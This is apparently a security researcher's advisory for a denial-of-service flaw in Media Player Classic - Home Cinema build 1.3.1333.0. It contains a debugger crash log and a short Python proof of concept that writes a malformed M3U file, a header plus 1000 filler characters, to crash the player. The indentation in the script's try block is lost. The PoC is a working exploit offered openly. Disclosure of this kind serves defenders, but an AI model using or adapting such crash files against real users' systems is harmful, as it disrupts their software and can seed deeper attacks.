@@ -1,0 +1,75 @@
+Tested on:
+Media Player Classic - Home Cinema
+Build number: 1.3.1333.0
+MPC Compiler: VS 2008
+FFmpeg Compiler: GCC 4.4.1
+
+
+###################CRASH REPORT START##################
+ModLoad: 77be0000 77bf5000   C:\WINDOWS\system32\MSACM32.dll
+ModLoad: 77bd0000 77bd7000   C:\WINDOWS\system32\midimap.dll
+ModLoad: 73ee0000 73ee4000   C:\WINDOWS\system32\KsUser.dll
+ModLoad: 10000000 100fb000   C:\Program Files\K-Lite Codec
+Pack\Filters\vsfilter.dll
+ModLoad: 590b0000 590ce000   C:\WINDOWS\system32\wmpasf.dll
+ModLoad: 71b20000 71b32000   C:\WINDOWS\system32\MPR.dll
+ModLoad: 6bf50000 6bfcd000   C:\WINDOWS\system32\dxmasf.dll
+ModLoad: 02530000 0257f000   C:\WINDOWS\system32\DRMClien.DLL
+(6dc.cec): C++ EH exception - code e06d7363 (!!! second chance !!!)
+............................... ISSUE
+eax=01c2f2e4 ebx=80040218 ecx=00000000 edx=00200003 esi=01c2f36c
+edi=003fd08c
+eip=7c812aeb esp=01c2f2e0 ebp=01c2f334 iopl=0         nv up ei pl nz na pe
+nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000
+efl=00000206
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for
+C:\WINDOWS\system32\kernel32.dll -
+kernel32!RaiseException+0x52:
+7c812aeb 5e              pop     esi
+Missing image name, possible paged-out or corrupt data.
+Missing image name, possible paged-out or corrupt data.
+Missing image name, possible paged-out or corrupt data.
+0:004> g
+WARNING: Continuing a non-continuable exception
+(6dc.cec): Break instruction exception - code 80000003 (first chance)
+eax=01c2f2e4 ebx=80040218 ecx=00000000 edx=00200003 esi=00000000
+edi=003fd08c
+eip=0071d14b esp=01c2f37c ebp=01c2f39c iopl=0         nv up ei pl nz na pe
+nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000
+efl=00000206
+mpc_hc+0x31d14b:
+0071d14b cc              int     3
+
+###################CRASH REPORT END##################
+
+For images related to the vulnerability refer my blog
+http://darshanams.blogspot.com
+
+##########PoC Start################
+print("\n*****Program need to be run on Python 3.1*****")
+print ("""Media Player Classic - Home Cinema 1.3.1333.0 M3U File DoS
+(0-Day)\r\n\r\nTested on:\nWindows XP SP3\n
+Media Player Classic - Home Cinema\n\t\t Build number: 1.3.1333.0\n\t\t
+MPC Compiler: VS 2008\n\t\t FFmpeg Compiler: GCC 4.4.1\n""")
+
+head = "EXTM3U"
+buf = "D" * 1000
+
+mal_buf = head + buf
+#print ("mal_buf:",mal_buf)
+try:
+mpc_mal = open("mpc_m3u_crash.m3u",'w')
+mpc_mal.write (mal_buf)
+mpc_mal.close()
+print ("File Created Successfully: mpc_m3u_crash.m3u\n")
+except:
+print ("Cannnot Create M3U File\n")
+
+print ("[+] Found and Coded by: Praveen Darshanam\r\n")
+##########PoC End################
+
+Best Regards,
+Praveen Darshanam,
+Security Researcher
